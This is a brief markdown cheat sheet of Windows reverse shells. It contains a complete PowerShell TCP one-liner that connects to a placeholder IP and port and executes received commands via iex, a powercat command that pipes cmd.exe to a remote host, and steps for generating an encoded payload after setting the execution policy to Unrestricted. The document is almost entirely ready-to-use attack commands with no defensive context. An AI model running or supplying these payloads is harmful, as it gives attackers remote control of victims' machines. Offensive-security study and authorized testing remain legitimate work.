## Windows
### PowerShell
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()"
```

### Powercat
```powershell
powercat -c <IP> -p <PORT> -e cmd.exe
```

#### Encripted payload
Enable script execution
```
> Set-ExecutionPolicy Unrestricted
>  powercat -c <IP> -p <PORT> -e cmd.exe -ge > reverseshell.ps1
> powershell -E AaQBtAEUAbgBkACgAIgBgAHIAI[...]
```


